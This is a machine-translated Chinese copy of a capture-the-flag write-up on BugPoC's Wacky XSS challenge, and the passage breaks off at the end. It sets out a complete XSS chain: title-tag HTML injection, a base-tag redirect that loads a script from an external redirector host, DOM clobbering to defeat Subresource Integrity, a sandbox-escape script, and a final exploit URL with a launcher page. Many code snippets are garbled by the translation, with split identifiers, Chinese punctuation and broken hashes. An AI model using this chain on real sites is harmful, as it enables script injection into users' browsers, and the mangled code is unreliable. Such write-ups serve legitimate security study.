<html>
<head>
<title>Wacky XSS challenge with amazon (by bugpoc)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">与亚马逊的古怪XSS挑战</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/wacky-xss-challenge-with-amazon-by-bugpoc-d10d43d7707c?source=collection_archive---------1-----------------------#2020-11-10">https://infosecwriteups.com/wacky-xss-challenge-with-amazon-by-bugpoc-d10d43d7707c?source=collection_archive---------1-----------------------#2020-11-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="2c9a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi kl translated">嘿，欢迎来到古怪XSS挑战赛。在整篇文章中，我会尽量不局限于我特别使用的有效载荷或步骤，但也会给你们提供一个成功完成这一挑战的思考过程的前排座位。</p><p id="6d69" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">挑战赛在https://wacky.buggywebsite.com/<a class="ae ku" href="https://wacky.buggywebsite.com/" rel="noopener ugc nofollow" target="_blank">举行，于美国东部时间11月9日晚上10点结束。</a></p><p id="6591" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了便于解释，我将挑战分成几个部分:</p><figure class="kv kw kx ky gt kz"><div class="bz fp l di"><div class="la lb l"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">我们开始吧</figcaption></figure><h1 id="c0fb" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated"><strong class="ak"> 1。最初的立足点html注入</strong></h1><p id="55d3" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">当你进入挑战时，你会看到这个输入框，经过一番思考后，我意识到它只有2页，外加几个脚本。</p><figure class="kv kw kx ky gt kz gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi mj"><img src="../Images/ad6fc7eea3eb2586ef117daaea3c5f46.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wB1fqQOddGPBen0cM4vI4g.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">主页</figcaption></figure><p id="bb88" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的文本反映在内部的iframe页面上，简单地查看框架源代码就可以发现我们的文本在两个地方得到了反映。</p><ol class=""><li id="1d1b" class="mq mr iq jp b jq jr ju jv jy ms kc mt kg mu kk mv mw mx my bi translated">标题标签</li><li id="1640" class="mq mr iq jp b jq mz ju na jy nb kc nc kg nd kk mv mw mx my bi translated">每个字母都用不同字体的无聊文本</li></ol><p id="5220" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一个非常简单的有效载荷就可以揭示出title标签容易受到html注入的攻击</p><blockquote class="ne nf ng"><p id="02c8" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"> <script>警戒(1) </script></p></blockquote><p id="f6ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于一种叫做内容安全策略的防御机制，我们的脚本显然无法执行。所以让我们进入下一步。</p><figure class="kv kw kx ky gt kz"><div class="bz fp l di"><div class="la lb l"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">我们进来了，让游戏开始吧。</figcaption></figure><h1 id="80d8" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">2.智胜CSP</h1><p id="975b" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">转到“网络”选项卡，查看页面标题:</p><blockquote class="ne nf ng"><p id="1e6f" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"><strong class="jp ir">内容-安全-策略:</strong>script-src ' nonce-ucbgymcgoplw ' ' strict-dynamic '；frame-src ' self '；object-src“无”；</p></blockquote><p id="57db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里需要关注的事情很少:</p><ol class=""><li id="86ff" class="mq mr iq jp b jq jr ju jv jy ms kc mt kg mu kk mv mw mx my bi translated">nonce——这使得在我们将随机生成的nonce值作为脚本头的一部分之前，无法呈现任何javascript。因为这在每次页面重新加载时都会改变，我们无法预先预测。</li><li id="8b4b" class="mq mr iq jp b jq mz ju na jy nb kc nc kg nd kk mv mw mx my bi translated">frame-src——它使用诸如<frame/>和<iframe>之类的元素来指定嵌套浏览上下文加载的有效源。<a class="ae ku" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src" rel="noopener ugc nofollow" target="_blank">更多在此</a></iframe></li></ol><p id="de35" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们得到nonce，我们可以运行任何脚本。所以，很自然地，首先我们要试着泄露它。有几个关于这方面的资源，但不幸的是没有一个真正为我们工作。所以没有被打败，只是把这个放在一边，我试着四处打探一下。</p><p id="c21f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae ku" href="https://csp-evaluator.withgoogle.com/" rel="noopener ugc nofollow" target="_blank"><em class="nh">https://csp-evaluator.withgoogle.com/</em></a><em class="nh">——因为我们喜欢将事情自动化</em></p><p id="7bb8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在此处输入您的csp，我们会得到一个严重程度很高的错误</p><blockquote class="ne nf ng"><p id="9772" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"><strong class="jp ir">基-乌</strong>【失踪】</p><p id="aba5" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">缺少base-uri允许注入基本标记。它们可用于设置攻击者控制的域的所有相对(脚本)URL的基本URL。可以设置为‘无’或者‘自’吗？</p></blockquote><p id="acf0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">那么什么是base-uri或者base标签呢？</strong></p><p id="2e1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">假设网页有一个html标签<em class="nh"> &lt; xxx src=/path &gt;，</em>换句话说，每当使用相对路径而不是完整的url时，页面会以<em class="nh">www.origin/path</em>的形式完成此操作，但是如果存在基本标签(例如<code class="fe nl nm nn no b">&lt;base target="_blank" href="https://example.com/"&gt;</code>)。然后，不管它在哪个页面上，它都会解析为https://<em class="nh">example.com/path</em>。<a class="ae ku" href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base" rel="noopener ugc nofollow" target="_blank">阅读更多</a>。</p><p id="1558" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以让我们寻找所有的东西都从相对路径加载:</p><ol class=""><li id="cd76" class="mq mr iq jp b jq jr ju jv jy ms kc mt kg mu kk mv mw mx my bi translated">script.setAttribute('src '，' files/analytics/js/frame-analytics . js ')；</li><li id="4294" class="mq mr iq jp b jq mz ju na jy nb kc nc kg nd kk mv mw mx my bi translated"><source src="”movie.mp4&quot;" type="”video/mp4&quot;"/></li></ol><p id="d7b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们有两种情况，我们可以强迫页面加载我们的文件。</p><p id="4e72" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在第二种情况下，因为类型是mp4，你可以加载任意的mp4并导致<strong class="jp ir"> <em class="nh">远程文件包含</em> </strong>但这不是我们在这里的动机。</p><p id="3dee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，除非我们在chrome的视频解析库中发现漏洞并加载恶意视频，否则我们无法真正引发XSS。</p><p id="cca7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，首先—这里应用了一种称为<strong class="jp ir">子资源完整性</strong>的防御。</p><p id="5cfc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nh">为什么这是一件大事？</em> <br/>因为它加载脚本内容的哈希值，并将其与硬编码的哈希值进行比较，所以即使我们能够导入自己的脚本，我们也不能将其更改为开发人员引入的真实脚本之外的任何内容。<a class="ae ku" href="https://w3c.github.io/webappsec-subresource-integrity/" rel="noopener ugc nofollow" target="_blank">更多在此</a>。</p><p id="3622" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当前有效载荷:</p><blockquote class="ne nf ng"><p id="d2b6" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"> <base target="”iframe”" href="”https://xxxxx.redir.bugpoc.ninja/&quot;"/></p></blockquote><p id="2b0d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里我使用的是bugpoc的<a class="ae ku" href="https://bugpoc.com/testers/other/mock" rel="noopener ugc nofollow" target="_blank">模拟端点</a>和<a class="ae ku" href="https://bugpoc.com/testers/other/redir" rel="noopener ugc nofollow" target="_blank">灵活重定向器</a>，因为这比在https服务器上托管一个文件并不断对其进行修改和定义文件头要容易得多。</p><p id="f35f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看起来像…</p><figure class="kv kw kx ky gt kz"><div class="bz fp l di"><div class="la lb l"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">显然，我们不能让子资源完整性成为我们的绊脚石。</figcaption></figure><h1 id="3c58" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">3.破坏子资源完整性</h1><p id="4b80" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">黑客最可怕的噩梦——散列函数。</p><p id="b061" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于子资源被散列并与硬编码值进行比较，我们实际上只有3种选择:</p><ol class=""><li id="45ca" class="mq mr iq jp b jq jr ju jv jy ms kc mt kg mu kk mv mw mx my bi translated">在跳过验证的SRI实现中找到一个异常。</li><li id="8c1a" class="mq mr iq jp b jq mz ju na jy nb kc nc kg nd kk mv mw mx my bi translated">使用相同的哈希创建不同的恶意脚本。</li><li id="8414" class="mq mr iq jp b jq mz ju na jy nb kc nc kg nd kk mv mw mx my bi translated">更改我们与之比较的值。</li></ol><p id="3a9a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">自谷歌Chrome 49.0.2623.75修补CVE-2016–1636以来，没有任何已知的漏洞影响该库。所以第一选择是不可能的。</p><p id="9a77" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们都知道哈希冲突的存在。但只是理论上的。所以，我也排除了第二种选择。</p><p id="c3d4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，我们只剩下第三种选择，这似乎也是不可能的。<em class="nh">或者是？</em></p><h2 id="38ca" class="np lh iq bd li nq nr dn lm ns nt dp lq jy nu nv lu kc nw nx ly kg ny nz mc oa bi translated">多姆奋力营救！！！</h2><p id="05fc" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">下面是来自页面源代码的一个片段:</p><blockquote class="ne nf ng"><p id="8f49" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"><script nonce="xxxxxxxx">&lt;br/&gt;window . file integrity = window . file integrity | | {&lt;br/&gt;' RFC ':'&lt;a class="ae ku" href="https://w3c.github.io/webappsec-subresource-integrity/'," rel="noopener ugc nofollow" target="_blank"&gt;https://w3c.github.io/webappsec-subresource-integrity/',&lt;/a&gt;&lt;br/&gt;'算法':' sha256 '，&lt;br/&gt;'值':' unzmi 6 suinzmtzzoonv 4y 9 yqajtsogiygyrkvumyri 6 e = '，&lt;br/&gt; — snip —&lt;/root&gt;</script></p></blockquote><p id="daa7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">JavaScript开发人员常用的模式是:</p><p id="5271" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nh">var someObject = window . someObject | | { }；</em></p><p id="3da4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你能控制页面上的一些HTML，你可以用一个DOM节点，比如一个锚来破坏someObject引用……”</p><p id="021e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个在这里<a class="ae ku" href="https://portswigger.net/web-security/dom-based/dom-clobbering" rel="noopener ugc nofollow" target="_blank">很好解释</a>。</p><p id="5717" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是常见的有效载荷有:</p><blockquote class="ne nf ng"><p id="c5c9" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"><form id="”fileIntegrity”">T15】</form></p></blockquote><p id="bec7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不会在这里删除它，因为因为我们也使用了base tag，所以它被修改为</p><blockquote class="ne nf ng"><p id="8498" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">sha256-www.redir.com/d8Ic1uV……….d12CUZbfm8czJw=</p></blockquote><p id="891c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">代替</p><blockquote class="ne nf ng"><p id="fe7c" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">sha 256-d 8 IC 1 uv 7 I……wd 12 cuz BFM 8 czjw =</p></blockquote><p id="9dbe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">经过一番阅读，我最终制定了另一个有效载荷——也可以在这里找到<a class="ae ku" href="https://portswigger.net/research/dom-clobbering-strikes-back" rel="noopener ugc nofollow" target="_blank"/>。</p><p id="dce2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以到目前为止我们的有效载荷是:</p><blockquote class="ne nf ng"><p id="3175" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"><base target="”iframe”" href="”https://xxxxxxxx.redir.bugpoc.ninja/&quot;"/><output id="fileIntegrity">S7 ukmoqthwrlejgnjpzfhm 0 yhrdeczffe 0 zjasrro 0 u =</output></p></blockquote><p id="ffd8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们基本上已经声明了一个全局变量(它覆盖了硬编码的变量):<br/><em class="nh">file integrity . value = the _ hash _ of _ our _ file//你可以在控制台</em>中尝试一下</p><p id="d9df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有几种方法可以获得散列值，但是输入错误的散列值会在控制台显示正确的散列值，所以这是最快的方法。</p><p id="9ab0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于iframe沙盒，我们现在还不能弹出警报，但是继续，尝试在您的js文件中包含console . log(" hacked ")；)你值得一些血清素。</p><figure class="kv kw kx ky gt kz"><div class="bz fp l di"><div class="la lb l"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">拦截了一条来自:SRI to:iframe-sandbox//第4章-阻止我们的最后一次绝望尝试</figcaption></figure><h1 id="4399" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">4.打破沙盒</h1><p id="347c" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">我们的挑战是显示一个警告框，如果你看这里</p><blockquote class="ne nf ng"><p id="15fa" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">//创建沙盒iframe<br/>analytics frame = document . createelement(' iframe ')；<br/>analytics frame . set attribute(' sandbox '，'<strong class="jp ir">allow-scripts allow-same-origin</strong>')；<br/>analytics frame . set attribute(' class '，' invisible ')；<br/>document . body . appendchild(analytics frame)；</p></blockquote><p id="6d28" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为我们的脚本加载在iframe中，为了能够显示一个警告框，我们需要一个属性<em class="nh"> allow-modal </em>，这里没有。</p><p id="b9bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不要再谷歌iframe沙盒旁路了，你不会找到任何有价值的东西，但是如果你去<a class="ae ku" href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe" rel="noopener ugc nofollow" target="_blank">这里</a>并向下滚动。您将看到一条警告消息。</p><blockquote class="ne nf ng"><p id="eab4" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"><strong class="jp ir">关于沙盒的注意事项:</strong></p><p id="e3eb" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">当嵌入的文档与嵌入的页面具有相同的原点时，<strong class="jp ir">强烈建议</strong>不要同时使用<code class="fe nl nm nn no b">allow-scripts</code>和<code class="fe nl nm nn no b">allow-same-origin</code>，因为这会让嵌入的文档删除<code class="fe nl nm nn no b">sandbox</code>属性——这并不比完全不使用<code class="fe nl nm nn no b">sandbox</code>属性更安全。</p></blockquote><figure class="kv kw kx ky gt kz"><div class="bz fp l di"><div class="la lb l"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">我们的脚本与沙盒的原始iframe。</figcaption></figure><p id="05f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，我们必须编写一个脚本，删除iframe并用一个没有限制的iframe替换它。你跟着吗？这听起来很容易，但实际上这方面的信息并不多。</p><p id="8f5b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae ku" href="https://github.com/dusekdan/RandomSecurity/tree/master/iframeSandboxDiscouragedCombination" rel="noopener ugc nofollow" target="_blank"> Dusekdan </a>为我们提供了这方面的概念验证——遗憾的是，它真的不能马上为我们工作，所以下面是我做了一些调整的代码(我没有删除这次演示的一些原始代码，因为它提供了很好的可视化效果):</p><blockquote class="ne nf ng"><p id="47d5" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">const illegal code =()= &gt; {<br/>alert("您应该看不到我，因为原始iframe没有' allow-modals '。尽管iframe有allow-scripts和同源。创建了一个没有沙盒属性的新iframe我就在这里了。”);<br/>//遗憾的是，这无论如何都无法启动<br/> }</p><p id="e6e8" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">const escape =()= &gt; {<br/>document . body . innertext = " Loaded into a frame，"；</p><p id="60e1" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">let parent = window.parent<br/>let container = parent . document . getelementsbytagname(" iframe ")[0]；<br/>if(parent . document . getelementsbytagname(" iframe ")[0]！= null) { <br/> //重新创建并插入一个没有沙盒属性的iframe，<br/> //按照我们的规则玩。<br/>let replacement = parent . document . createelement(" iframe ")；<br/>replacement . set attribute(" id "，" escaped already ")；<br/>//由于<br/> //frame-src self csp，我们不再使用src到这个脚本，一个干净的解决方法是在脚本标签<br/>中输入数据，让g = document . createelement(" script ")；<br/>g . innerhtml = " alert(origin)"；<br/>replacement . appendchild(g)；<br/>parent . document . body . append(替换)；</p><p id="0603" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">//移除原iframe(避免无限循环)<br/>container . parent node . Remove child(container)；</p><p id="1547" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">//else语句中的代码对我们不起作用，因为我们没有再次打开这个脚本//<br/>} else {<br/>illegal code()；<br/> } <br/> }</p><p id="475e" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">escape()；</p></blockquote><p id="02bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们从iframe内部转到父文档，选择标签，然后重新创建一个iframe，但没有沙箱属性，并在其中添加了我们的小脚本。</p><p id="ee21" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以通过bugpoc转到<a class="ae ku" href="https://bugpoc.com/testers/other/mock" rel="noopener ugc nofollow" target="_blank"> <em class="nh">模拟端点</em> </a> <em class="nh"> </em>并保存这个脚本，然后转到<a class="ae ku" href="https://bugpoc.com/testers/other/redir" rel="noopener ugc nofollow" target="_blank"> <em class="nh">灵活重定向器</em> </a>并在那里粘贴链接，并获得要插入到base标记中的url。</p><p id="8315" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不要忘记添加标题</p><blockquote class="ne nf ng"><p id="1a2b" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">访问控制允许来源:*</p></blockquote><p id="39f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的有效载荷现在终于:</p><blockquote class="ne nf ng"><p id="f60f" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"><base target="”iframe”" href="”&lt;a" class="ae ku" rel="noopener ugc nofollow"/>https://zu2i14sjykqz.redir.bugpoc.ninja/&gt;&lt;output id = file integrity&gt;S7 ukmoqthwrlejgnjpzfhm 0 yhrdeczffe 0 zjasrro 0 u =&lt;/output&gt;</p></blockquote><figure class="kv kw kx ky gt kz"><div class="bz fp l di"><div class="la lb l"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">我们的payload^</figcaption></figure><h1 id="47c7" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">5.自动输入该有效载荷</h1><p id="d507" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">但是说服受害者在他的网页上输入这个有点过分了。</p><p id="b965" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你只是去检查元素，你会看到我们的有效载荷iframe的url。</p><p id="bda2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将链接复制并粘贴到新选项卡中。</p><p id="6f78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">它不起作用，因为页面需要加载到iframe中。</strong></p><p id="af9b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们最后一次看代码:</p><blockquote class="ne nf ng"><p id="3517" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">//验证我们是否在iframe<br/>if(window . name = = ' iframe '){</p></blockquote><p id="03d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以让我们最后一次为<a class="ae ku" href="https://www.youtube.com/watch?v=BPgEgaPk62M" rel="noopener ugc nofollow" target="_blank">做一些脚本:</a></p><blockquote class="ne nf ng"><p id="2a03" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"> <br/> &lt;正文&gt;</p><p id="c6b5" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"><p>点击按钮开始攻击</p></p><p id="c477" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"><button onclick="”myFunction()”">按钮</button></p><p id="f897" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"><script/></p><p id="7eec" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">函数my function(){<br/>my window = window . open("<a class="ae ku" href="https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20target=%22iframe%22%20href=%22https://zu2i14sjykqz.redir.bugpoc.ninja/%22%3E%3Coutput%20id=fileIntegrity%3Es7ukMoQThWrleJgNJPZfhm0YhrdECzffE0ZjASRRO0U=%3C/output%3E" rel="noopener ugc nofollow" target="_blank">https://wacky.buggywebsite.com/frame.html?param = % 3C/title % 3E % 3c base % 20 target = % 22i frame % 22% 20 href = % 22 https://zu 2 i14 sjykqz . redir . bug POC . ninja/% 22% 3E % 3c output % 20id = file integrity % 3es 7 ukmoqthwrlejgnjpzfhm 0 yhrdeczf Fe 0 zjasrro 0 u = % 3C/output % 3E</a>、“iframe”、“width=2000、height = 1000”)；<br/> }</p><p id="91e1" class="jn jo nh jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"/></blockquote><p id="fd7d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">打开一个窗口并将其命名为iframe就成功了，我们得到了一个漂亮的警告框显示origin，然后amazon会显示一个警告框感谢我们的参与。</p><figure class="kv kw kx ky gt kz"><div class="bz fp l di"><div class="la lb l"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">pwnd</figcaption></figure></div><div class="ab cl ob oc hu od" role="separator"><span class="oe bw bk of og oh"/><span class="oe bw bk of og oh"/><span class="oe bw bk of og"/></div><div class="ij ik il im in"><h1 id="a5be" class="lg lh iq bd li lj oi ll lm ln oj lp lq lr ok lt lu lv ol lx ly lz om mb mc md bi translated">保持安全</h1><p id="d141" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">以上所有攻击都是由于开发者过于信任开箱即用的防御解决方案造成的。</p><blockquote class="on"><p id="7635" class="oo op iq bd oq or os ot ou ov ow kk dk translated">堡垒的坚固程度取决于它最薄弱的地方。</p></blockquote><p id="976f" class="pw-post-body-paragraph jn jo iq jp b jq 